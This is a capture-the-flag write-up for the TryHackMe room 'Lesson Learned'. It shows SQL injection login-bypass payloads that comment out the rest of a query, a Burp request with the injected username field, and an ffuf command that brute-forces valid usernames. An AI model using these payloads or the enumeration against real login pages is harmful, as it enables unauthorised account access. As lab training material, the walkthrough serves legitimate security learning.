---
render_with_liquid: false
title: Lesson Learned
tags: [tryhackme, sqli, auth-bypass, brute-force-attack]
---



> https://tryhackme.com/room/lessonlearned

# Info

This is a relatively easy machine that tries to teach you a lesson, but perhaps you've already learned the lesson? Let's find out.

Treat this box as if it were a real target and not a CTF.  

Get past the login screen and you will find the flag. There are no rabbit holes, no hidden files, just a login page and a flag. Good luck!

# Exploit


## Login Bypass Failed

![](/assets/obsidian/8d61a76cdd7ede64e596897210c8d4b4.png)

![](/assets/obsidian/e7ac091f354f8b54c509cdc763e829d7.png)

![](/assets/obsidian/a2c3ad98bde1006d3212314507046db5.png)

## Use the right login bypass payload

According to *Tib3rius*'s' tweet

> https://twitter.com/0xTib3rius/status/1624819441044185088?ref_src=twsrc%5Etfw

![](/assets/obsidian/a0be056224174d6a25c510310d70f765.png)

Correct Payload : 

```sql
username'; -- -

# or
username' AND 1=1 -- -
```

User `admin` doesn't seem to exist

![](/assets/obsidian/be8173184a5becbd1c61afd09668521b.png)


## Brute force a valid user

Save the login request from burp suite, and replace the username parameter to `FUZZ`

```bash
vi login.req
```

```http
POST / HTTP/1.1
Host: 10.10.101.99
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.15.32/
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Origin: http://10.10.15.32
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1
Pragma: no-cache
Cache-Control: no-cache

username=FUZZ%27%3B+--+-&password=123
```

```bash
ffuf -c -request login.req -request-proto http -w /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt -fs 1298
```

![](/assets/obsidian/fc26b284b4182a9033abc86ec18228a4.png)

![](/assets/obsidian/55554665e3c12437505b615c920f7bfe.png)

![](/assets/obsidian/dddb952b1426a649f14b583e99919a1f.png)